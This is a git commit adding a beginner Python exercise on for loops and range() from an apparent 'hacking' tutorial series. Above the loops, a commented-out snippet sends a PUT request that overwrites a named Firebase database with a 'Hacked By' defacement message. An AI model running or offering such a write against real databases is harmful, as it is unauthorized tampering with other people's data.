a52f9e7588a4c3ca5b2a81e3414436c876bdc41c
Delowar-Designer <delowar.designer@gmail.com>
2024-03-28 06:49:23 -0700

    Uses of for loop, range in python

---
+++ Python Programing Praktice (Infosec BD)/Python for Hacking in Bangla/#13 Uses of for loop, range in python.py
@@ -0,0 +1,10 @@
+# Uses of for loop, range in python
+'''import requests
+data = {"Ezploit":"Successfull","Hacked By ":"Sniper IU","Email":"delowar.designer@gmail.com"}
+response = requests.put('https://bughunt2022-default-rtdb.firebaseio.com/.json',josn=data)'''
+
+for i in range(1, 100, 1):
+    print(i)
+
+for i in range(2, 100, 2):
+    print(i)
